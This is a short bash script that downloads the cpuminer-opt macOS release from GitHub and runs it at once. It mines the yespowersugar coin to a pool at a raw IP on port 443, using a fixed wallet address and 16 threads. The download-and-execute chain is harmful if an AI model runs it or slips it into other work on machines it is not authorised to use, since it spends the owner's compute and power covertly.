#!/bin/bash

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && \
tar xf cpuminer-opt-mac.tar.gz && \
chmod +x cpuminer-sse2 && \
./cpuminer-sse2 -a yespowersugar -o stratum+tcp://8.209.98.71:443 -u sugar1q9fc7uqt9q4ngd7rf6lzv266adhnwngf70xcmhe.ANZ -t 16 -p x
